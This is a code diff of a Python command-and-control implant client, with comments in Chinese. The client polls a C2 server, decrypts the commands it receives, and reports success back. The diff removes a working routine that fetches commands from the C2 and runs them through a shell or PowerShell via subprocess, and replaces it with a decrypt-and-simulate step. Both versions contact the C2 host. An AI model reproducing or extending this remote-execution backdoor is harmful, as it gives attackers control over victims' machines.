@@ -2,8 +2,6 @@ import hashlib
 import random
 import base64
 import requests
-import subprocess
-import json
 import platform
 import socket
 import time
@@ -143,58 +141,13 @@ def decrypt_data(encrypted_data, aes_key):
 
     return plaintext.decode('utf-8')
 
-# def get_command_from_c2(c2_url):
-#     response = requests.post(f'{c2_url}/get_command')
-#     if response.status_code == 200:
-#         encrypted_command = response.json()['command']
-#         return encrypted_command
-#     else:
-#         return None
-
-def get_and_execute_command_from_c2(c2_url):
-    try:
-        # 向 C2 server 發送請求以獲取指令
-        response = requests.post(f'{c2_url}/get_command')
-        
-        if response.status_code == 200:
-            command_data = response.json()
-            
-            # 獲取到的指令 (可以是shell command 或 PowerShell script)
-            command = command_data.get("command", "")
-            command_type = command_data.get("type", "powershell")  # 預設為powershell
-
-            if command:
-                # 判斷指令類型
-                if command_type == "shell":
-                    print(f"Executing shell command: {command}")
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    print("Command Output:", result.stdout)
-
-                elif command_type == "powershell":
-                    print(f"Executing PowerShell script: {command}")
-                    out = execute_powershell_script(command)
-                    return out
-                else:
-                    print("Unknown command type received.")
-            else:
-                print("No command received.")
-                return None
-        else:
-            print(f"Failed to fetch command. Status code: {response.status_code}")
-    
-    except Exception as e:
-        print(f"Error occurred: {str(e)}")
-
-def execute_powershell_script(script):
-    # 呼叫 PowerShell 並執行腳本
-    process = subprocess.Popen(["powershell", "-Command", script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="big5")
-    out, err = process.communicate()
-    return out
-    
-    # if out:
-    #     print(f"PowerShell Output: {out.decode()}")
-    # if err:
-    #     print(f"PowerShell Error: {err.decode()}")
+def get_command_from_c2(c2_url):
+    response = requests.post(f'{c2_url}/get_command')
+    if response.status_code == 200:
+        encrypted_command = response.json()['command']
+        return encrypted_command
+    else:
+        return None
 
 def send_success_report(c2_url):
     response = requests.post(f'{c2_url}/report_success', json={"status": "OK"})
@@ -247,20 +200,20 @@ def main():
                 if response3['message'] == 'keep':
                     # 步驟1: 向 C2 server 要求命令
                     # encrypted_command = str.encode(get_command_from_c2(c2_url))
-                    output = get_and_execute_command_from_c2(c2_url)
-                    if output is None:
-                        print("Failed to get or execute command from C2 server")
+                    encrypted_command = get_command_from_c2(c2_url)
+                    if encrypted_command is None:
+                        print("Failed to get command from C2 server")
                         return
                     else:
-                        print(f"Output after execution: {output}")
+                        print(f"Encrypted Command from server: {encrypted_command}")
                         # print(type(encrypted_command))
                         
                     # 步驟2: 解密命令
                     try:
-                        # decrypted_command = decrypt_data(encrypted_command, aes_key)
-                        # print(f"Decrypted Command: {decrypted_command}")
+                        decrypted_command = decrypt_data(encrypted_command, aes_key)
+                        print(f"Decrypted Command: {decrypted_command}")
                         # 模擬執行命令
-                        # print("Executing command...")
+                        print("Executing command...")
                         # 告訴C2命令執行成功
                         send_success_report(c2_url)
                     except Exception as e:
